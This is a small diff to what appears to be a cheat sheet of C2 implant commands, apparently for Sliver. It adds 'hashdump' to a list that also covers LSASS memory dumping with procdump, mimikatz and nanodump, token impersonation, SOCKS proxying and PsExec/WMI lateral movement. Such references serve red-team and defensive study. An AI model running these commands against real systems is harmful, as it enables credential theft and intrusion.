@@ -43,6 +43,7 @@ getsystem             # Attempt to elevate to NT AUTHORITY\SYSTEM (via named pip
 procdump [pid]        # Dump process memory to your local machine (e.g., for lsass offline)
 mimikatz [args]       # Execute Mimikatz commands (Requires installing via Armory)
 nanodump              # Dump LSASS memory stealthily (Requires installing via Armory)
+hashdump
 
 ### USER IMPERSONATION & TOKENS ###
 make-token [dom\usr]  # Create a token with credentials for network auth (PTH)
@@ -56,3 +57,4 @@ socks5 start          # Start a SOCKS5 proxy server routed through the implant
 psexec [args]         # Execute via PsExec (Requires installing alias/extension via Armory)
 wmi [args]            # Execute commands via WMI (Requires installing alias/extension via Armory)
 ```
+
